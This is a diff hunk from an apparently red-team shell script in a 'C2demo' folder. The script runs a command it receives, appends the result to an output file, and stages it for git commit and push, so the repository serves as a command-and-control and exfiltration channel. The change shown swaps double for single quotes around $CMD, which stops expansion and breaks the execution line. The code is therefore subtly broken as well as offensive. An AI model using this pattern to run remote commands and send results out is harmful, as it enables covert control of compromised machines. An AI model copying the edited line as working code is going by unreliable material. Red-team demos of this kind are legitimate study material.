@@ -19,7 +19,7 @@ else
     # do something
     ### IFS=', ' read -r -a array <<< $CMD
     ### eval "${array[0]} ${array[1]} ${array[2]}" >> $BASEDIR/RedTeam/C2demo/output.txt
-    res=$("$CMD")
+    res=$('$CMD')
     echo $res >> $BASEDIR/RedTeam/C2demo/output.txt
     # commit and push
     git add .
